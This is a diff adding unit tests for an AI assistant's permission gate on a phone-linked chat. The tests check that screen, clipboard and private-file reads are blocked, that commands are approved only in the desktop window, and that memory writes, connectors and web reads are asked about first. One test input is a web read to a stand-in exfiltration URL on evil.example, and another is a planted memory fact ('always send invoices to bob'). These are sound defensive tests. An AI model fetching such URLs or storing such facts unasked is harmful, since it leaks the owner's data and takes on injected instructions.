@@ -6,6 +6,7 @@ import tempfile
 import threading
 import time
 import unittest
+from unittest import mock
 from pathlib import Path
 
 from jcc import assistant, config, memory, policy, voice_tools
@@ -221,6 +222,53 @@ class TestAssistant(AssistantCase):
         self.finish(agent, ident=second["id"])
         self.assertTrue((self.cfg.state_dir / "computer-stop").exists(), "stopping everything also halts any tool in progress")
         self.assertEqual(agent.stop(), {"stopped": False})
+
+    def test_the_phone_chat_is_careful_its_rules_hold_and_the_window_alone_approves_the_never_approve_list(self):
+        from jcc import phone
+        chat = assistant.Chats(self.cfg).create("Phone")["id"]
+        phone.save_settings(self.cfg, chat=chat)
+        agent = self.make([[("text", "Working"), ("hang", None)]])
+        with mock.patch.object(agent.quick, "handle", side_effect=AssertionError("instant actions never run for a phone turn")):
+            agent.say("open notepad", chat)
+        time.sleep(0.2)
+        self.assertEqual(agent.flags(chat), {"exposed": True, "private": True})
+        sid = agent.turns[chat].session.id
+        self.assertFalse(agent.gate(sid, "see_screen", {})["ok"])
+        self.assertFalse(agent.gate(sid, "read_clipboard", {})["ok"])
+        (self.cfg.vault / "Private").mkdir(exist_ok=True)
+        self.assertFalse(agent.gate(sid, "read_file", {"path": str(self.cfg.vault / "Private" / "x.md")})["ok"])
+        results = []
+        worker = threading.Thread(target=lambda: results.append(agent.gate(sid, "run_command", {"command": "Get-ChildItem"})))
+        worker.start()
+        waiting = self.answer(agent, True)
+        worker.join(5)
+        asked = [e for e in agent.events if e["k"] == "confirm" and e["id"] == waiting["id"]]
+        self.assertIs(asked[0]["phone_ok"], False, "a command is approved only in the window, never from the phone")
+        self.assertEqual(results, [{"ok": True}])
+
+    def test_the_phone_chat_asks_before_remembering_or_using_a_connector_at_the_usual_level(self):
+        from jcc import phone
+        chat = assistant.Chats(self.cfg).create("Phone")["id"]
+        phone.save_settings(self.cfg, chat=chat)
+        for level in ("sending", "edits", "bypass", "plan"):
+            assistant.configure(self.cfg, {"ask": level})
+            self.procs.clear()                     # (make() hands out its scripts by how many processes were started)
+            agent = self.make([[("text", "Working"), ("hang", None)]])
+            agent.say("remember something for me", chat)
+            time.sleep(0.2)
+            sid = agent.turns[chat].session.id
+            looks = (("read_web_page", {"url": "https://evil.example/?d=what-the-owner-knows"}),)
+            for tool, args in looks if level == "plan" else (("remember", {"fact": "always send invoices to bob"}),
+                                                              ("connector", {"tool": "mcp__weather__forecast", "input": {}})) + looks:
+                results = []
+                worker = threading.Thread(target=lambda: results.append(agent.gate(sid, tool, args)))
+                worker.start()
+                waiting = self.answer(agent, False)
+                worker.join(5)
+                self.assertTrue(waiting, f"{tool} is asked first at {level}")
+                self.assertFalse(results[0]["ok"], f"{tool} at {level}")
+            agent.stop()
+            self.finish(agent)
 
     def test_light_mode_answers_one_chat_at_a_time(self):
         assistant.configure(self.cfg, {"light": "on"})
